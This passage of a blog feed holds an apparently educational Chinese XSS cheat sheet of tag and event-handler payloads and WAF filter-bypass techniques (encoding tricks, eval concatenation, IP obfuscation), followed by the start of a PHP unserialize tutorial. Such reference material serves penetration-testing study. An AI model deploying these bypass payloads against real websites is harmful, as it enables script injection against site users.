class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;details&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;svg&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;select&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;ifrme&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;video&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;audio&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;body&gt;</code></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></div><p>利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;textarea&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;keygen&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br></pre></td></tr></table></figure></div><p><code>&lt;marquee&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure></div><p><code>&lt;isindex&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure></div><p>利用 link 远程包含 js 文件</p><p><strong>PS：在无 CSP 的情况下才可以</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议">#</a> javascript 伪协议</h3><p><a>标签</a></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;iframe&gt;</code>  标签</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code>  标签</p><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">//IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;form&gt;</code>  标签</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="其它"><a class="markdownIt-Anchor" href="#其它">#</a> 其它</h3><p><code>expression</code>  属性</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt; <span class="comment">// IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> <span class="comment">//IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;x:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span> <span class="comment">// IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>background</code>  属性</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure></div><h2 id="绕过过滤"><a class="markdownIt-Anchor" href="#绕过过滤">#</a> 绕过过滤</h2><h3 id="1空格"><a class="markdownIt-Anchor" href="#1空格">#</a> 1. 空格</h3><p>用 <code>/</code>  代替空格:  <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="2过滤关键词"><a class="markdownIt-Anchor" href="#2过滤关键词">#</a> 2. 过滤关键词</h3><h4 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过">#</a> 大小写绕过</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字">#</a> 双写关键字</h4><p>有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接">#</a> 字符拼接</h4><h5 id="利用eval"><a class="markdownIt-Anchor" href="#利用eval">#</a> 利用 eval</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="利用top"><a class="markdownIt-Anchor" href="#利用top">#</a> 利用 top</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆">#</a> 其它字符混淆</h4><p>有的 waf 可能是用正则表达式去检测是否有 xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(`xss`);&quot;</span>&gt;</span> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过">#</a> 编码绕过</h4><h5 id="unicode编码绕过"><a class="markdownIt-Anchor" href="#unicode编码绕过">#</a> Unicode 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="url编码绕过"><a class="markdownIt-Anchor" href="#url编码绕过">#</a> url 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="ascii码绕过"><a class="markdownIt-Anchor" href="#ascii码绕过">#</a> Ascii 码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="hex绕过"><a class="markdownIt-Anchor" href="#hex绕过">#</a> hex 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="八进制"><a class="markdownIt-Anchor" href="#八进制">#</a> 八进制</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="base64绕过"><a class="markdownIt-Anchor" href="#base64绕过">#</a> base64 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="3过滤引号"><a class="markdownIt-Anchor" href="#3过滤引号">#</a> 3. 过滤引号</h3><p>1. 如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 使用编码绕过，具体看上面我列举的例子</p><h3 id="4过滤括号"><a class="markdownIt-Anchor" href="#4过滤括号">#</a> 4. 过滤括号</h3><p>使用 throw 绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure></div><h3 id="5过滤url地址"><a class="markdownIt-Anchor" href="#5过滤url地址">#</a> 5. 过滤 url 地址</h3><h4 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码">#</a> 使用 url 编码</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip">#</a> 使用 IP</h4><p>1. 十进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 八进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>3.hex</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>4.html 标签中用 <code>//</code>  可以代替 <code>http://</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure></div><p>6. 使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span>//会自动跳转到百度</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss&quot;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&quot;跨站脚本攻击&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#跨站脚本攻击&quot;&gt;#&lt;/a&gt; 跨站脚本攻</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP Unserialize</title>
    <link href="http://example.com/2024/04/09/PHP-Unserialize/"/>
    <id>http://example.com/2024/04/09/PHP-Unserialize/</id>
    <published>2024-04-09T13:51:55.000Z</published>
    <updated>2024-04-11T12:30:08.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-unserialize"><a class="markdownIt-Anchor" href="#php-unserialize">#</a> PHP Unserialize</h1><h2 id="什么是序列化和反序列化"><a class="markdownIt-Anchor" href="#什么是序列化和反序列化">#</a> 什么是序列化和反序列化</h2><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><h3 id="serialize的特征"><a class="markdownIt-Anchor" href="#serialize的特征">#</a> serialize 的特征</h3><p>常见的序列化格式有</p><blockquote><p>二进制格式</p><p>字节数组</p><p>json 字符串</p><p>xml 字符串</p></blockquote><p>常见的数组样例</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure></div><p>输出  <code>a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span><br><span class="line">a:array代表是数组，后面的3说明有三个属性</span><br><span class="line">i:代表是整型数据int，后面的0是数组下标</span><br><span class="line">s:代表是字符串，后面的4是因为xiao长度为4</span><br></pre></td></tr></table></figure></div><p>数据类型对应提示符</p><p><code>字符串：s</code></p><p><code>已转义字符串：S</code></p><p><code>整数：i</code></p><p><code>布尔值： b</code></p><p><code>空值：N</code></p><p><code>数组：a</code></p><p><code>对象：O</code></p><p><code>引用： R</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code>  使用：私有的类的名称 (考虑到继承的情况) 和字段名组合  <code>\x00类名称\x00字段名</code></li><li><code>protected</code>  使用:  <code>*</code>  和字段名组合  <code>\x00*\x00字段名</code></li></ul><h3 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法">#</a> 魔术方法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td 